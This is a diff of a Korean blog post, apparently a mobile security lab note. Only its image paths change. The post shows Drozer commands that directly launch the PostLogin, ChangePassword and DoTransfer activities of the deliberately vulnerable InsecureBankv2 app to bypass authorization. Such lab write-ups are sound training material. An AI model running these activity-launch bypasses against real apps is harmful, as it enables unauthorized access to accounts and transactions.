@@ -47,25 +47,25 @@ author_profile: false
 
 ### Drozer을 이용한 실습
 
-![그림 1-1](image.png)
+![그림 1-1](/assets/image/vuln/mobile-vuln/adnroid-vuln/Weak%20Authorization%20mechanism/image.png)
 - 위와 같이 Drozer을 통해서 외부에서 접근 가능한 액티비티들을 보여준다.
 
 ```
 run app.activity.start --component com.android.insecurebankv2 com.android.insecurebankv2.PostLogin
 ```
-![그림 1-3](image-1.png)
+![그림 1-3](/assets/image/vuln/mobile-vuln/adnroid-vuln/Weak%20Authorization%20mechanism/image-1.png)
 
 ```
 run app.activity.start --component com.android.insecurebankv2 com.android.insecurebankv2.ChangePassword
 ```
 
-![그림 1-4](image-2.png)
+![그림 1-4](/assets/image/vuln/mobile-vuln/adnroid-vuln/Weak%20Authorization%20mechanism/image-2.png)
 
 ```
 run app.activity.start --component com.android.insecurebankv2 com.android.insecurebankv2.DoTransfer
 ```
 
-![그림 1-5](image-3.png)
+![그림 1-5](/assets/image/vuln/mobile-vuln/adnroid-vuln/Weak%20Authorization%20mechanism/image-3.png)
 
 <br>
 <hr>
